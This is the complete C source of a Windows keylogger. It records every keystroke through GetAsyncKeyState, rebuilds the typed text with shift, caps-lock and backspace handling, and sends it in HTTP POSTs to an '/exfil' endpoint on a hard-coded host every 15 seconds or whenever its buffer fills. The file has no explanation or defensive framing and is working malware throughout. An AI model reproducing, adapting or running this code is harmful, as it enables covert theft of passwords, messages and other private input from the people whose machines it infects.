#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")

#define SERVER "10.2.0.19"
#define PORT 80
#define LOG_BUFFER_SIZE 1024

void exfiltrate_data(const char* data) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char message[2048], response[4096];
    int result;

    sprintf(message,
        "POST /exfil HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %d\r\n\r\n"
        "data=%s",
        SERVER, (int)(strlen(data) + 5), data);

    result = WSAStartup(MAKEWORD(2, 2), &wsa);
    if (result != 0) return;
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    server.sin_addr.s_addr = inet_addr(SERVER);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    result = connect(s, (struct sockaddr*)&server, sizeof(server));
    if (result != 0) {
        closesocket(s);
        WSACleanup();
        return;
    }

    send(s, message, (int)strlen(message), 0);
    recv(s, response, sizeof(response), 0);

    closesocket(s);
    WSACleanup();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    char log_buffer[LOG_BUFFER_SIZE] = { 0 };
    int log_index = 0;
    int key;
    ULONGLONG last_exfil = GetTickCount64();

    SHORT shift_pressed, caps_lock;

    while (1) {
        for (key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                shift_pressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                caps_lock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

                // Backspace support
                if (key == VK_BACK) {
                    if (log_index > 0) {
                        log_index--;
                        log_buffer[log_index] = '\0';
                    }
                    continue;
                }
                // Space and Enter
                if (key == VK_SPACE) {
                    log_buffer[log_index++] = ' ';
                }
                else if (key == VK_RETURN) {
                    log_buffer[log_index++] = '\n';
                }
                // Letters
                else if (key >= 65 && key <= 90) {
                    int upper = 0;
                    if (caps_lock ^ shift_pressed) upper = 1;
                    log_buffer[log_index++] = upper ? key : key + 32;
                }
                // Numbers/punctuation
                else if ((key >= 48 && key <= 57) || (key >= 186 && key <= 222)) {
                    BYTE keyboard_state[256];
                    WORD unicode[2];
                    int r;
                    if (GetKeyboardState(keyboard_state)) {
                        r = ToAscii(key, 0, keyboard_state, unicode, 0);
                        if (r == 1 && log_index < LOG_BUFFER_SIZE - 1) {
                            log_buffer[log_index++] = (char)unicode[0];
                        }
                    }
                }
                // Exfiltrate if buffer is nearly full
                if (log_index >= LOG_BUFFER_SIZE - 2) {
                    log_buffer[log_index] = '\0';
                    exfiltrate_data(log_buffer);
                    log_index = 0;
                    memset(log_buffer, 0, LOG_BUFFER_SIZE);
                    last_exfil = GetTickCount64();
                }
            }
        }
        // Exfiltrate every 15 seconds even if buffer isn't full
        if (log_index > 0 && (GetTickCount64() - last_exfil > 15000)) {
            log_buffer[log_index] = '\0';
            exfiltrate_data(log_buffer);
            log_index = 0;
            memset(log_buffer, 0, LOG_BUFFER_SIZE);
            last_exfil = GetTickCount64();
        }
        Sleep(10);
    }
    return 0;
}
